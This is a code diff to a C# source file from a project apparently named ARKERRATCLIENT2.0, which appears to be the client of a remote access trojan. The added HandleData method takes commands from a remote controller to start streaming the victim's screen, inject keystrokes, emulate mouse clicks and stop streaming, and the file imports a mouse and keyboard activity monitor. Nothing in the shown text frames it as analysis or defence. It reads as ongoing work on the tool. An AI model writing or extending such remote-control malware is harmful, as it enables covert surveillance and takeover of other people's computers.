@@ -13,11 +13,34 @@ using MouseKeyboardActivityMonitor.WinApi;
 using MouseKeyboardActivityMonitor.Controls;
 using System.Linq;
 using System.Text;
+using System.Data.SqlTypes;
 
 namespace ARKERRATCLIENT2._0
 {
     public static class RemoteDesktop
     {
+        public static void HandleData(string subString)
+        {
+            if (subString.Length == 0 && !RemoteDesktop.sendingFrames)
+            {
+                SendScreens();
+            }
+            else if (subString.Contains("§screen§"))
+            {
+                Task.Run(() => StartScreenStreaming(50, subString.Replace("§screen§", string.Empty)));
+            }
+            else if (subString.Contains("§KI§"))
+            {
+                EmulateKeyStrokes(subString.Replace("§KI§", string.Empty));
+            }
+            else if (subString.Contains("close") && RemoteDesktop.sendingFrames)
+            {
+                sendingFrames = false;
+            }
+            else if (subString.Contains("§ClickPositionStart§"))
+                EmulateClick(subString);
+        }
+
         public static bool sendingFrames = false;
         private const int ChunkSize = 32768;
 
